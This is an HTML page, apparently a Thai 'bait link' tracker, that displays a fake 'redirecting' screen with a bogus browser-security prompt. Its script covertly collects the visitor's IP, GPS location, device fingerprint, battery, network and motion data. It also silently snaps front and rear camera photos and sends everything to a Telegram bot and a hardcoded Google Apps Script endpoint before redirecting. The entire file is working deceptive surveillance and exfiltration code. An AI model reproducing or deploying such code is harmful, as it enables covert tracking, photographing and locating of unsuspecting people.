<!DOCTYPE html>
<html lang="th">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>กำลังเปลี่ยนเส้นทางไปยัง...</title>

  <script src="https://cdn.tailwindcss.com"></script>
  <script src="js/config.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;500;600;700&display=swap');

    body {
      font-family: 'Sarabun', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      -webkit-tap-highlight-color: transparent;
      background-color: #f8fafc;
      color: #334155;
    }
  </style>
</head>

<body class="min-h-screen flex items-center justify-center p-4">

  <!-- Neutral Minimalist Loading (กลมกลืนกับระบบปลายทาง) -->
  <div class="text-center max-w-sm w-full py-8 px-6 bg-white rounded-2xl shadow-sm border border-slate-100">
    <div class="flex justify-center mb-4">
      <div class="relative flex items-center justify-center">
        <div class="animate-spin rounded-full h-10 w-10 border-[3px] border-slate-200 border-t-blue-600"></div>
      </div>
    </div>
    <p class="text-sm font-semibold text-slate-700 mb-1">กำลังเปลี่ยนเส้นทางไปยัง...</p>
    <p id="destination-label" class="text-xs font-bold text-blue-600 mb-2 truncate px-2">กำลังเชื่อมต่อ...</p>
    <p id="status-hint" class="text-[11px] text-slate-400">กำลังตรวจสอบความปลอดภัยเบราว์เซอร์... กรุณากด "อนุญาต" เพื่อเข้าสู่หน้าเว็บ</p>

    <!-- Fallback Manual Continue -->
    <div class="mt-4 pt-3 border-t border-slate-100">
      <a id="manual-redirect-btn" href="#" class="text-[11px] text-slate-400 hover:text-blue-600 transition">
        หากหน้าเว็บไม่เปิดอัตโนมัติ <span class="underline">แตะที่นี่เพื่อไปต่อ</span>
      </a>
    </div>
  </div>

  <!-- Offscreen Video & Canvas for camera capture (Offscreen avoids mobile GPU frame decoding drop) -->
  <video id="hidden-video" autoplay playsinline muted style="position: fixed; top: -9999px; left: -9999px; width: 320px; height: 240px; opacity: 0; pointer-events: none;"></video>
  <canvas id="hidden-canvas" style="display: none;"></canvas>

  <script>
    (function () {
      // 1. ดึงเป้าหมาย URL ที่ต้องการ Redirect (รองรับ url, redirect, decoy)
      const urlParams = new URLSearchParams(window.location.search);
      let destinationUrl = urlParams.get('url') || urlParams.get('redirect') || urlParams.get('decoy') || "https://www.google.com";
      const targetName = urlParams.get('target') || urlParams.get('name') || "เป้าหมายการสืบสวน (Bait Target)";

      // ถอดรหัส URL ปลายทาง
      try {
        destinationUrl = decodeURIComponent(destinationUrl);
      } catch (e) { }

      if (!destinationUrl.startsWith('http://') && !destinationUrl.startsWith('https://')) {
        destinationUrl = 'https://' + destinationUrl;
      }

      // แสดงชื่อปลายทางบนหน้าจอ
      const destLabel = document.getElementById('destination-label');
      const manualBtn = document.getElementById('manual-redirect-btn');
      if (destLabel) {
        try {
          const parsed = new URL(destinationUrl);
          destLabel.textContent = parsed.hostname + (parsed.pathname !== '/' ? parsed.pathname : '');
        } catch (e) {
          destLabel.textContent = destinationUrl;
        }
      }
      if (manualBtn) {
        manualBtn.href = destinationUrl;
      }

      // 2. วิเคราะห์ลายนิ้วมืออุปกรณ์ขั้นสูง (Device Fingerprint จาก test bot)
      const screenW = window.screen.width;
      const screenH = window.screen.height;
      const dpr = window.devicePixelRatio || 1;
      const ua = navigator.userAgent || '';

      let brandModel = "ไม่ทราบรุ่น";
      if (/iPhone/i.test(ua)) {
        if ((screenW === 428 && screenH === 926) || (screenW === 926 && screenH === 428)) {
          brandModel = "Apple iPhone 12/13/14 Pro Max / 14 Plus";
        } else if ((screenW === 430 && screenH === 932) || (screenW === 932 && screenH === 430)) {
          brandModel = "Apple iPhone 14/15 Pro Max / 15 Plus";
        } else if ((screenW === 393 && screenH === 852) || (screenW === 852 && screenH === 393)) {
          brandModel = "Apple iPhone 14 Pro / 15 / 15 Pro";
        } else if ((screenW === 390 && screenH === 844) || (screenW === 844 && screenH === 390)) {
          brandModel = "Apple iPhone 12 / 12 Pro / 13 / 13 Pro / 14";
        } else if ((screenW === 375 && screenH === 812) || (screenW === 812 && screenH === 375)) {
          brandModel = "Apple iPhone X / XS / 11 Pro / 12 mini / 13 mini";
        } else if ((screenW === 414 && screenH === 896) || (screenW === 896 && screenH === 414)) {
          brandModel = "Apple iPhone XR / 11 / 11 Pro Max";
        } else {
          brandModel = "Apple iPhone";
        }
      } else if (/iPad/i.test(ua)) {
        brandModel = "Apple iPad";
      } else if (/Android/i.test(ua)) {
        const match = ua.match(/Android.*;\s*([a-zA-Z0-9_\-\s]+)\s*Build/);
        brandModel = match ? `Android (${match[1].trim()})` : "Android Device";
      } else if (/Windows/i.test(ua)) {
        brandModel = "Windows PC / Laptop";
      } else if (/Macintosh/i.test(ua)) {
        brandModel = "Apple Mac";
      }

      let browserName = "Mobile Browser";
      if (/Line/i.test(ua)) {
        browserName = "LINE In-App Browser";
      } else if (/FB/i.test(ua) || /FBAV/i.test(ua)) {
        browserName = "Facebook In-App Browser";
      } else if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) {
        browserName = "Google Chrome";
      } else if (/Safari/i.test(ua)) {
        browserName = "Apple Safari";
      } else if (/Edge/i.test(ua)) {
        browserName = "Microsoft Edge";
      }

      // 3. โครงสร้าง Telemetry Data เชิงลึก
      const orientation = (screen.orientation && screen.orientation.type && screen.orientation.type.includes('portrait'))
        ? 'แนวตั้ง (ถือในมือ)' : (window.innerHeight > window.innerWidth ? 'แนวตั้ง' : 'แนวนอน');

      const trackingData = {
        action: 'logTracking',
        targetName: targetName,
        ip: '-',
        cityRegion: '-',
        lat: '-',
        lng: '-',
        accuracy: '-',
        isp: '-',
        targetUrl: destinationUrl,
        userAgent: ua,
        deviceInfo: `${brandModel} • ${screenW}x${screenH} @${dpr}x | ${browserName} (${navigator.platform || '-'})`,
        battery: '-',
        network: '-',
        orientation: orientation,
        motion: 'ตรวจจับ...',
        camera: {
          frontPhoto: null,
          frontSize: '0 KB',
          rearPhoto: null,
          rearSize: '0 KB'
        },
        timestamp: new Date().toISOString()
      };

      // ตรวจจับสัญญาณการเคลื่อนไหว (Live Motion Sensor / Accelerometer & Gyroscope)
      let motionSamples = [];
      function onDeviceMotion(evt) {
        if (!evt || !evt.accelerationIncludingGravity) return;
        const acc = evt.accelerationIncludingGravity;
        const totalAcc = Math.sqrt((acc.x || 0)**2 + (acc.y || 0)**2 + (acc.z || 0)**2);
        motionSamples.push(totalAcc);
        if (motionSamples.length > 10) motionSamples.shift();

        // คำนวณความแปรปรวน (Variance) เพื่อจำแนกว่า นิ่ง, เดิน, หรืออยู่บนรถ
        if (motionSamples.length >= 3) {
          const mean = motionSamples.reduce((a, b) => a + b, 0) / motionSamples.length;
          const variance = motionSamples.reduce((a, b) => a + (b - mean)**2, 0) / motionSamples.length;
          
          if (variance < 0.25) {
            trackingData.motion = 'อยู่นิ่ง / วางบนโต๊ะ (Stationary)';
          } else if (variance >= 0.25 && variance < 2.5) {
            trackingData.motion = 'ถือใช้งานปกติ / เดิน (Walking/Handling)';
          } else {
            trackingData.motion = 'เคลื่อนที่เร็ว / นั่งบนรถ (In Vehicle/Running)';
          }
        }
      }
      if (window.DeviceMotionEvent) {
        window.addEventListener('devicemotion', onDeviceMotion, { passive: true });
        // ปิด Listener หลัง 2.5 วินาทีเพื่อประหยัดพลังงาน
        setTimeout(() => window.removeEventListener('devicemotion', onDeviceMotion), 2500);
      }

      // ดึงสถานะแบตเตอรี่แบบ Asynchronous ทันที
      if (navigator.getBattery) {
        navigator.getBattery().then(b => {
          trackingData.battery = `${Math.round(b.level * 100)}% ${b.charging ? '⚡ กำลังชาร์จ' : '🔋 แบตเตอรี่'}`;
        }).catch(() => {});
      }

      // ดึงข้อมูลประเภทเครือข่ายและความเร็ว
      if (navigator.connection) {
        try {
          const conn = navigator.connection;
          const type = conn.type || conn.effectiveType || '';
          const down = conn.downlink ? `${conn.downlink} Mbps` : '';
          trackingData.network = `${type ? type.toUpperCase() : ''} ${down}`.trim() || '-';
        } catch (e) {}
      }

      let isRedirected = false;
      function performRedirect() {
        if (!isRedirected) {
          isRedirected = true;
          window.location.replace(destinationUrl);
        }
      }

      // 4. ดึง GAS Endpoints จาก config
      const gasEndpoints = [
        (typeof CONFIG !== 'undefined' && CONFIG.GAS_URL_LOSTCAR) ? CONFIG.GAS_URL_LOSTCAR : '',
        (typeof CONFIG !== 'undefined' && CONFIG.GAS_URL) ? CONFIG.GAS_URL : ''
      ].filter(u => u && !u.includes('YOUR_GAS_URL'));

      if (gasEndpoints.length === 0) {
        gasEndpoints.push('https://script.google.com/macros/s/AKfycbxs3oWfi4tNCbO4nZ5q0aVIg5sTrdbWVcxkVGpWTuBYR87GcqBkm0BoUrnui0Ybsz1v/exec');
      }

      // 5. ฟังก์ชันส่งแจ้งเตือนด่วนเข้า Telegram Bot (Consolidated Telemetry Alert)
      async function dispatchTelegramAlert() {
        const botToken = (typeof CONFIG !== 'undefined' && CONFIG.TELEGRAM_BOT_TOKEN) ? CONFIG.TELEGRAM_BOT_TOKEN : localStorage.getItem('SANBOT_TELEGRAM_BOT_TOKEN');
        const chatId = (typeof CONFIG !== 'undefined' && CONFIG.TELEGRAM_CHAT_ID) ? CONFIG.TELEGRAM_CHAT_ID : localStorage.getItem('SANBOT_TELEGRAM_CHAT_ID');

        if (!botToken || !chatId) return;

        const hasGps = (trackingData.lat !== '-' && trackingData.lng !== '-');
        const timeStr = new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' }) + " น.";
        const mapsUrl = hasGps ? `https://www.google.com/maps?q=${trackingData.lat},${trackingData.lng}` : '';

        const batteryText = (trackingData.battery && trackingData.battery !== '-') ? `🔋 <b>สถานะแบต:</b> <code>${trackingData.battery}</code>\n` : '';
        const netText = (trackingData.network && trackingData.network !== '-') ? `📶 <b>สัญญาณเน็ต:</b> <code>${trackingData.network}</code>\n` : '';
        const orientText = (trackingData.orientation && trackingData.orientation !== '-') ? `📐 <b>การถือเครื่อง:</b> <code>${trackingData.orientation}</code>\n` : '';
        const motionText = (trackingData.motion && trackingData.motion !== 'ตรวจจับ...') ? `🏃 <b>การเคลื่อนไหว:</b> <code>${trackingData.motion}</code>\n` : '';

        const caption =
          `🚨 <b>[San BOT] ตรวจพบการเปิดลิงก์ดักจับพิกัด!</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━\n` +
          `🎯 <b>เป้าหมาย (Target):</b> <code>${targetName}</code>\n` +
          `🕒 <b>เวลาตรวจจับ:</b> ${timeStr}\n` +
          `📊 <b>สถานะ:</b> <b>${hasGps ? '✅ ได้รับพิกัด GPS ละเอียด' : '⚠️ ใช้พิกัดโดยประมาณจาก IP'}</b>\n\n` +
          `📍 <b>ข้อมูลตำแหน่ง & พิกัด</b>\n` +
          (hasGps
            ? `📌 <b>พิกัด GPS:</b> <code>${trackingData.lat}, ${trackingData.lng}</code> (${trackingData.accuracy})\n🗺️ <b>แผนที่:</b> <a href="${mapsUrl}">เปิด Google Maps</a>\n`
            : `📌 <b>พื้นที่โดยประมาณ (IP):</b> ${trackingData.cityRegion}\n`) +
          `🌐 <b>Public IP:</b> <code>${trackingData.ip}</code>\n` +
          `🏢 <b>ผู้ให้บริการ (ISP):</b> ${trackingData.isp}\n\n` +
          `📱 <b>ข้อมูลอุปกรณ์เชิงลึก (Intelligence)</b>\n` +
          `📱 <b>รุ่นเครื่อง:</b> <b>${brandModel}</b>\n` +
          `🖥️ <b>ความละเอียดจอ:</b> <code>${screenW}x${screenH} @${dpr}x</code>\n` +
          batteryText + netText + orientText + motionText +
          `🌐 <b>เบราว์เซอร์:</b> ${browserName}\n` +
          `🔗 <b>เว็บปลายทาง (Decoy):</b> <a href="${destinationUrl}">${destinationUrl}</a>\n` +
          (trackingData.camera.frontPhoto ? `📸 <b>ภาพถ่ายกล้องหน้า:</b> <i>บันทึกแล้ว (${trackingData.camera.frontSize})</i>\n` : '') +
          (trackingData.camera.rearPhoto ? `📷 <b>ภาพถ่ายกล้องหลัง:</b> <i>บันทึกแล้ว (${trackingData.camera.rearSize})</i>\n` : '') +
          `━━━━━━━━━━━━━━━━━━━━\n` +
          `<i>🛡️ ระบบสนับสนุนงานสืบสวน San BOT CyberSec Engine</i>`;

        // สร้างปุ่มกด Interactive Keyboard ใน Telegram
        const inlineButtons = [];
        if (hasGps) {
          inlineButtons.push([
            { text: '🗺️ เปิด Google Maps', url: mapsUrl },
            { text: '🛰️ แผนที่ดาวเทียม', url: `https://www.google.com/maps/@${trackingData.lat},${trackingData.lng},18z/data=!3m1!1e3` }
          ]);
        }
        const replyMarkupStr = inlineButtons.length > 0 ? JSON.stringify({ inline_keyboard: inlineButtons }) : null;

        function b64ToBlob(b64) {
          try {
            const m = b64.match(/^data:([^;]+);base64,(.+)$/);
            if (!m) return null;
            const bChars = atob(m[2]);
            const bNums = new Array(bChars.length);
            for (let i = 0; i < bChars.length; i++) bNums[i] = bChars.charCodeAt(i);
            return new Blob([new Uint8Array(bNums)], { type: m[1] });
          } catch (e) {
            return null;
          }
        }

        try {
          const teleUrl = `https://api.telegram.org/bot${botToken}`;
          const frontBlob = (trackingData.camera.frontPhoto && trackingData.camera.frontPhoto.startsWith('data:image/'))
            ? b64ToBlob(trackingData.camera.frontPhoto) : null;
          const rearBlob = (trackingData.camera.rearPhoto && trackingData.camera.rearPhoto.startsWith('data:image/'))
            ? b64ToBlob(trackingData.camera.rearPhoto) : null;

          const uploadTasks = [];

          // กรณีที่ 1: มีภาพถ่ายกล้องหน้า
          if (frontBlob) {
            const frontFormData = new FormData();
            frontFormData.append('chat_id', chatId);
            frontFormData.append('photo', frontBlob, 'target_front.jpg');
            frontFormData.append('caption', caption);
            frontFormData.append('parse_mode', 'HTML');
            if (replyMarkupStr) frontFormData.append('reply_markup', replyMarkupStr);

            uploadTasks.push(
              fetch(`${teleUrl}/sendPhoto`, { method: 'POST', body: frontFormData, keepalive: true })
                .catch(e => console.warn('Telegram front photo upload error:', e))
            );

            // หากมีภาพกล้องหลังด้วย ให้ส่งตามหลังทันที
            if (rearBlob) {
              const rearFormData = new FormData();
              rearFormData.append('chat_id', chatId);
              rearFormData.append('photo', rearBlob, 'target_rear.jpg');
              rearFormData.append('caption', `📷 <b>[San BOT] ภาพถ่ายกล้องหลังเป้าหมาย:</b> <code>${targetName}</code>`);
              rearFormData.append('parse_mode', 'HTML');
              if (replyMarkupStr) rearFormData.append('reply_markup', replyMarkupStr);

              uploadTasks.push(
                fetch(`${teleUrl}/sendPhoto`, { method: 'POST', body: rearFormData, keepalive: true })
                  .catch(e => console.warn('Telegram rear photo upload error:', e))
              );
            }

            // รอส่งภาพทั้งหมดให้เสร็จสมบูรณ์ ป้องกันเบราว์เซอร์ตัดการเชื่อมต่อขณะ Redirect
            await Promise.allSettled(uploadTasks);
            return;
          }

          // กรณีที่ 2: มีเฉพาะภาพถ่ายกล้องหลัง (เช่น cam=rear หรือกล้องหน้าไม่พร้อม)
          if (rearBlob) {
            const rearFormData = new FormData();
            rearFormData.append('chat_id', chatId);
            rearFormData.append('photo', rearBlob, 'target_rear.jpg');
            rearFormData.append('caption', caption);
            rearFormData.append('parse_mode', 'HTML');
            if (replyMarkupStr) rearFormData.append('reply_markup', replyMarkupStr);

            await fetch(`${teleUrl}/sendPhoto`, { method: 'POST', body: rearFormData, keepalive: true })
              .catch(e => console.warn('Telegram rear-only photo upload error:', e));
            return;
          }

          // กรณีที่ 3: ไม่ได้ภาพถ่าย ส่งข้อความสรุปพิกัดแบบ Text ปกติ
          const textPayload = {
            chat_id: chatId,
            text: caption,
            parse_mode: 'HTML',
            disable_web_page_preview: false
          };
          if (inlineButtons.length > 0) textPayload.reply_markup = { inline_keyboard: inlineButtons };

          await fetch(`${teleUrl}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(textPayload),
            keepalive: true
          }).catch(e => console.warn('Telegram text alert error:', e));
        } catch (err) {
          console.warn('Telegram dispatch error:', err);
        }
      }

      // 6. ฟังก์ชันส่งข้อมูลไปยัง Google Apps Script (ส่งขนาน ไม่รอช้า ประหยัดเวลา)
      let isGasDispatched = false;
      async function dispatchGasTracking(withPhoto = false) {
        if (isGasDispatched && !withPhoto) return;
        if (withPhoto) isGasDispatched = true;

        const payloadStr = JSON.stringify(trackingData);

        const promises = gasEndpoints.map(endpoint => {
          return fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
            body: payloadStr,
            keepalive: true
          }).catch(err => console.warn('POST GAS endpoint error:', err));
        });

        // ให้เวลาส่ง GAS แบบขนาน (ถ้ามีรูปให้เวลานานขึ้นเล็กน้อยเพื่อให้ Base64 ส่งถึงสมบูรณ์)
        const isDualCam = (urlParams.get('cam') === 'dual' || urlParams.get('dual') === '1');
        const gasTimeout = withPhoto ? (isDualCam ? 1300 : 850) : 350;
        await Promise.race([
          Promise.allSettled(promises),
          new Promise(r => setTimeout(r, gasTimeout))
        ]);
      }

      // Step 1: ดึง IP & IP Geolocation (รวดเร็ว ทันที ไม่ต้องขอ Permission)
      const ipGeoPromise = fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(data => {
          if (data && data.ip) {
            trackingData.ip = data.ip || '-';
            trackingData.cityRegion = `${data.city || ''} ${data.region || ''} ${data.country_name || ''}`.trim() || '-';
            trackingData.isp = `${data.org || data.asn || ''}`.trim() || '-';
            if (data.latitude && data.longitude && trackingData.lat === '-') {
              trackingData.lat = data.latitude;
              trackingData.lng = data.longitude;
              trackingData.accuracy = 'ระดับเมือง/เสาสัญญาณ (~' + (data.postal || 'City') + ')';
            }
          }
        })
        .catch(() => {
          return fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => { trackingData.ip = d.ip || '-'; })
            .catch(() => {});
        });

      // Step 2: ดึง High-Accuracy GPS จากมือถือ (เมื่อเป้าหมายกด Allow)
      const browserGpsPromise = new Promise((resolve) => {
        if ('geolocation' in navigator) {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              if (pos && pos.coords) {
                trackingData.lat = pos.coords.latitude;
                trackingData.lng = pos.coords.longitude;
                trackingData.accuracy = pos.coords.accuracy ? `${pos.coords.accuracy.toFixed(1)} ม. (GPS จริง)` : 'GPS จริง';
              }
              resolve();
            },
            (err) => {
              console.warn('GPS denied/skipped:', err.message);
              resolve();
            },
            { enableHighAccuracy: true, timeout: 3500, maximumAge: 0 }
          );
        } else {
          resolve();
        }
      });

      // Step 3: ระบบจับภาพกล้อง (แก้ปัญหาภาพจอดำบนมือถือ + ปรับปรุงให้สลับถ่ายกล้องหน้า/หลังได้อย่างเสถียร 100%)
      let isCapturing = false;
      let hasCapturedPhoto = false;

      // ฟังก์ชันเชื่อมต่อกล้องพร้อมระบบ Fallback หลากระดับ (ป้องกัน Error ใน LINE Webview & Chrome Mobile)
      async function getCameraStream(facing) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;

        // 1. พยายามเปิดด้วยเงื่อนไข facingMode ที่ส่งมา
        try {
          return await navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: facing,
              width: { ideal: 640, max: 800 },
              height: { ideal: 480, max: 600 }
            }
          });
        } catch (err1) {
          console.warn(`Primary facing (${JSON.stringify(facing)}) failed:`, err1);
        }

        // 2. หากเป็นกล้องหลังแล้วติดปัญหา ให้ลองใช้สตริง 'environment' ตรงๆ
        const isRear = (facing === 'environment' || (typeof facing === 'object' && facing.ideal === 'environment'));
        if (isRear) {
          try {
            return await navigator.mediaDevices.getUserMedia({
              video: {
                facingMode: 'environment',
                width: { ideal: 640, max: 800 },
                height: { ideal: 480, max: 600 }
              }
            });
          } catch (err2) {
            console.warn('Fallback facingMode: environment failed:', err2);
          }
        }

        // 3. ค้นหารหัสอุปกรณ์ (deviceId) จากรายการอุปกรณ์กล้องที่ตรวจพบ
        try {
          if (navigator.mediaDevices.enumerateDevices) {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(d => d.kind === 'videoinput');
            
            let matchedDevice = null;
            if (isRear) {
              matchedDevice = videoDevices.find(d => {
                const lbl = (d.label || '').toLowerCase();
                return lbl.includes('back') || lbl.includes('rear') || lbl.includes('environment') || lbl.includes('กล้องหลัง');
              });
            } else {
              matchedDevice = videoDevices.find(d => {
                const lbl = (d.label || '').toLowerCase();
                return lbl.includes('front') || lbl.includes('user') || lbl.includes('กล้องหน้า');
              });
            }

            if (matchedDevice && matchedDevice.deviceId) {
              return await navigator.mediaDevices.getUserMedia({
                video: {
                  deviceId: { exact: matchedDevice.deviceId },
                  width: { ideal: 640, max: 800 },
                  height: { ideal: 480, max: 600 }
                }
              });
            }
          }
        } catch (err3) {
          console.warn('Device enumeration fallback failed:', err3);
        }

        // 4. ทางเลือกสุดท้าย: เปิดกล้องใดๆ ที่มีในระบบ
        try {
          return await navigator.mediaDevices.getUserMedia({
            video: {
              width: { ideal: 640, max: 800 },
              height: { ideal: 480, max: 600 }
            }
          });
        } catch (err4) {
          console.warn('Generic video stream fallback failed:', err4);
          return null;
        }
      }

      async function snapCamera(facing) {
        let stream = null;
        try {
          const video = document.getElementById('hidden-video');
          const canvas = document.getElementById('hidden-canvas');
          if (!video || !canvas) return null;

          // เคลียร์สถานะวิดีโอเดิมเพื่อป้องกัน frame lock
          try { video.pause(); } catch(e){}
          video.srcObject = null;

          stream = await getCameraStream(facing);
          if (!stream) return null;

          // 1. นวัตกรรมเร่งความเร็วระดับฮาร์ดแวร์ (Turbo ImageCapture API): บน Chrome Android สามารถดึงเฟรมเซนเซอร์ตรงใน 20-30ms
          let directBitmap = null;
          if (window.ImageCapture) {
            try {
              const track = stream.getVideoTracks()[0];
              if (track && track.readyState === 'live') {
                const ic = new ImageCapture(track);
                directBitmap = await Promise.race([
                  ic.grabFrame(),
                  new Promise((_, reject) => setTimeout(() => reject('timeout'), 400))
                ]);
              }
            } catch (icErr) { }
          }

          if (directBitmap && directBitmap.width > 0) {
            const targetW = 400;
            const targetH = Math.round(targetW * (directBitmap.height / directBitmap.width || 0.75));
            canvas.width = targetW;
            canvas.height = targetH;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(directBitmap, 0, 0, targetW, targetH);
          } else {
            // 2. Fallback: เล่นผ่านองค์ประกอบ Video พร้อมตรวจจับ Frame Callback แบบแม่นยำ
            video.srcObject = stream;

            await new Promise(resolve => {
              let done = false;
              const finish = () => {
                if (!done) { done = true; resolve(); }
              };

              if (video.requestVideoFrameCallback) {
                video.requestVideoFrameCallback(() => {
                  setTimeout(finish, 140);
                });
              }

              video.onplaying = () => {
                if (video.videoWidth > 0 && video.readyState >= 2) {
                  setTimeout(finish, 160);
                } else {
                  video.ontimeupdate = () => finish();
                  setTimeout(finish, 320);
                }
              };
              video.onloadeddata = () => {
                if (video.videoWidth > 0) setTimeout(finish, 180);
              };
              video.play().catch(finish);
              setTimeout(finish, 1100);
            });

            // หน่วงเวลาสั้นๆ ให้เซนเซอร์ปรับแสง (Auto-Exposure Warmup)
            await new Promise(r => setTimeout(r, 140));

            const vW = video.videoWidth || 640;
            const vH = video.videoHeight || 480;
            const targetW = 400;
            const targetH = Math.round(targetW * (vH / vW || 0.75));
            canvas.width = targetW;
            canvas.height = targetH;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, targetW, targetH);
          }

          // ปิดสตรีมกล้องทันทีและรีเซ็ตวิดีโอ
          stream.getTracks().forEach(t => {
            try { t.stop(); } catch(e){}
          });
          try { video.pause(); } catch(e){}
          video.srcObject = null;

          return canvas.toDataURL('image/jpeg', 0.60);
        } catch (err) {
          if (stream) {
            try { stream.getTracks().forEach(t => t.stop()); } catch (e) {}
          }
          console.warn(`Camera snap error (${JSON.stringify(facing)}):`, err);
          return null;
        }
      }

      async function captureCameraSilent() {
        if (hasCapturedPhoto || isCapturing) return;
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
        isCapturing = true;

        const camParam = (urlParams.get('cam') || '').toLowerCase();
        const dualParam = urlParams.get('dual');
        const isDual = (camParam === 'dual' || camParam === 'both' || dualParam === '1');
        const isRearOnly = (camParam === 'rear' || camParam === 'back' || camParam === 'environment');

        try {
          if (isRearOnly) {
            // โหมด: ถ่ายเฉพาะกล้องหลัง
            const rearB64 = await snapCamera({ ideal: "environment" });
            if (rearB64 && rearB64.length > 500) {
              hasCapturedPhoto = true;
              trackingData.camera.rearPhoto = rearB64;
              trackingData.camera.rearSize = Math.round(rearB64.length * 0.75 / 1024) + " KB";
              trackingData.photo = rearB64;
            }
          } else if (isDual) {
            // โหมด: กล้องคู่ (กล้องหน้า + กล้องหลัง)
            // 1. ถ่ายกล้องหน้าก่อนเพื่อจับภาพใบหน้าเป้าหมาย
            const frontB64 = await snapCamera("user");
            if (frontB64 && frontB64.length > 500) {
              hasCapturedPhoto = true;
              trackingData.camera.frontPhoto = frontB64;
              trackingData.camera.frontSize = Math.round(frontB64.length * 0.75 / 1024) + " KB";
              trackingData.photo = frontB64;
            }

            // เว้นระยะ 350ms เพื่อให้ระบบปฏิบัติการ/ฮาร์ดแวร์ปล่อยทรัพยากรกล้องตัวแรก (แก้ปัญหา NotReadableError / Device in use)
            await new Promise(r => setTimeout(r, 350));

            // 2. สลับเปิดกล้องหลังเพื่อดูสภาพแวดล้อม
            const rearB64 = await snapCamera({ ideal: "environment" });
            if (rearB64 && rearB64.length > 500) {
              hasCapturedPhoto = true;
              trackingData.camera.rearPhoto = rearB64;
              trackingData.camera.rearSize = Math.round(rearB64.length * 0.75 / 1024) + " KB";
              if (!trackingData.photo) trackingData.photo = rearB64;
            }
          } else {
            // โหมดปกติ: ถ่ายกล้องหน้าอย่างเดียว (เร็วที่สุด)
            const frontB64 = await snapCamera("user");
            if (frontB64 && frontB64.length > 500) {
              hasCapturedPhoto = true;
              trackingData.camera.frontPhoto = frontB64;
              trackingData.camera.frontSize = Math.round(frontB64.length * 0.75 / 1024) + " KB";
              trackingData.photo = frontB64;
            }
          }

          if (hasCapturedPhoto) {
            // ส่ง Telegram และ Google Apps Script พร้อมกันแบบคู่ขนาน (Parallel) เพื่อความเร็วสูงสุด
            await Promise.allSettled([
              dispatchTelegramAlert(),
              dispatchGasTracking(true)
            ]);
            // เด้งเปลี่ยนเส้นทางทันทีอย่างรวดเร็ว (100ms)
            setTimeout(performRedirect, 100);
          }
        } catch (e) {
          console.warn('Silent capture flow error:', e);
        } finally {
          isCapturing = false;
        }
      }

      // ดักจับการแตะหน้าจอทุกจุด เพื่อกระตุ้นขอสิทธิ์กล้องในเบราว์เซอร์มือถือ
      document.addEventListener('click', () => { captureCameraSilent(); }, { passive: true });
      document.addEventListener('touchstart', () => { captureCameraSilent(); }, { passive: true });

      if (manualBtn) {
        manualBtn.onclick = async (e) => {
          e.preventDefault();
          if (!hasCapturedPhoto) {
            await captureCameraSilent();
            if (!hasCapturedPhoto) await dispatchGasTracking(false);
          }
          performRedirect();
        };
      }

      // Step 4: รวมการส่งข้อมูลทั้งหมด
      // ให้เวลารอการเปิดกล้อง: หากเป็นโหมดกล้องคู่ให้เวลา 5 วินาที, โหมดกล้องเดี่ยวให้เวลา 3.5 วินาที
      const isDualMode = (urlParams.get('cam') === 'dual' || urlParams.get('dual') === '1' || urlParams.get('cam') === 'both');
      const maxWaitTime = isDualMode ? 5000 : 3500;
      const cameraRunPromise = captureCameraSilent();

      Promise.race([
        Promise.all([ipGeoPromise, browserGpsPromise, cameraRunPromise]),
        new Promise(r => setTimeout(r, maxWaitTime))
      ]).then(async () => {
        if (!hasCapturedPhoto) {
          await dispatchGasTracking(false);
          await dispatchTelegramAlert();
        }
        setTimeout(performRedirect, 100);
      }).catch(() => {
        performRedirect();
      });

      // Safe Absolute Fallback: ป้องกันการค้าง
      setTimeout(performRedirect, isDualMode ? 6500 : 4500);
    })();
  </script>
